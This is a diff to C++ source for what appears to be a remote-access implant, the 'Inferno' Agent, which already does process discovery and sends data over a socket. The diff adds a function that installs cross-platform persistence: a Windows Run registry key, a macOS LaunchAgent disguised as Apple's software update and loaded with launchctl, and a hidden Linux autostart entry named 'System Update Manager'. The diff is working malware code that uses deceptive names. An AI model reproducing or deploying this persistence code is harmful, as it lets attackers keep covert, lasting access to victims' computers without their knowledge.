@@ -1,5 +1,7 @@
 #include "../include/Agent.hpp"
 #include <iostream>
+#include <cstdio>
+#include <cstdlib>
 #include <chrono>
 #include <thread>
 #include <random>
@@ -18,6 +20,7 @@
 #else
 #include <unistd.h>
 #include <sys/utsname.h>
+#include <sys/stat.h>
 #include <pwd.h>
 #endif
 
@@ -353,6 +356,78 @@ void Agent::handleProcessDiscovery() {
         
         m_socket.sendData(res.serialize());
     }
+}
+
+void Agent::installPersistence(const std::string& binary_path) {
+    if (binary_path.empty()) return;
+
+#ifdef _WIN32
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "InfernoAgent", 0, REG_SZ,
+                       reinterpret_cast<const BYTE*>(binary_path.c_str()),
+                       static_cast<DWORD>(binary_path.size() + 1));
+        RegCloseKey(hKey);
+    }
+#elif defined(__APPLE__)
+    const char* home = ::getenv("HOME");
+    if (!home) return;
+
+    std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
+    std::string plist_path = plist_dir + "/com.apple.softwareupdate.plist";
+
+    // Create directory
+    ::mkdir(plist_dir.c_str(), 0755);
+
+    // Write plist XML
+    FILE* f = ::fopen(plist_path.c_str(), "w");
+    if (!f) return;
+    std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.apple.softwareupdate</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>%s</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <false/>
+</dict>
+</plist>
+)", binary_path.c_str());
+    ::fclose(f);
+
+    // Load the plist
+    ::system(("launchctl load " + plist_path).c_str());
+#else
+    // Linux: autostart .desktop file
+    const char* home = ::getenv("HOME");
+    if (!home) return;
+
+    std::string autostart_dir = std::string(home) + "/.config/autostart";
+    std::string desktop_path = autostart_dir + "/inferno-agent.desktop";
+
+    ::mkdir(autostart_dir.c_str(), 0755);
+
+    FILE* f = ::fopen(desktop_path.c_str(), "w");
+    if (!f) return;
+    std::fprintf(f, R"([Desktop Entry]
+Type=Application
+Name=System Update Manager
+Exec=%s
+Hidden=true
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+)", binary_path.c_str());
+    ::fclose(f);
+#endif
 }
 
 std::string Agent::getHardwareUUID() {
